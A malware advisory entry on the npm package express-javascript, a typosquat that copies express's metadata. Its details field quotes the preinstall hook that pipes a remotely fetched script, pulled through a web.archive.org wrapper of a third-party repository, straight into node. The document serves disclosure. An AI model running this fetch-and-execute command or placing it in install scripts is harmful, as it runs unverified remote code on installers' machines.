summary: express typosquat runs remote script at install time
details: express-javascript@5.2.1 impersonates the express package (copying its description, author, contributors, repository, homepage, and dependency list verbatim) while its package.json preinstall lifecycle hook runs `curl https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts/raw/branch/main/node.js | node`, fetching a JavaScript file from a third-party account unrelated to the express publisher via a web.archive.org wrapper on a mutable `branch/main` ref and piping it into node with no integrity check. Every `npm install` of this package executes whatever bytes that endpoint returns on the installer's machine.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
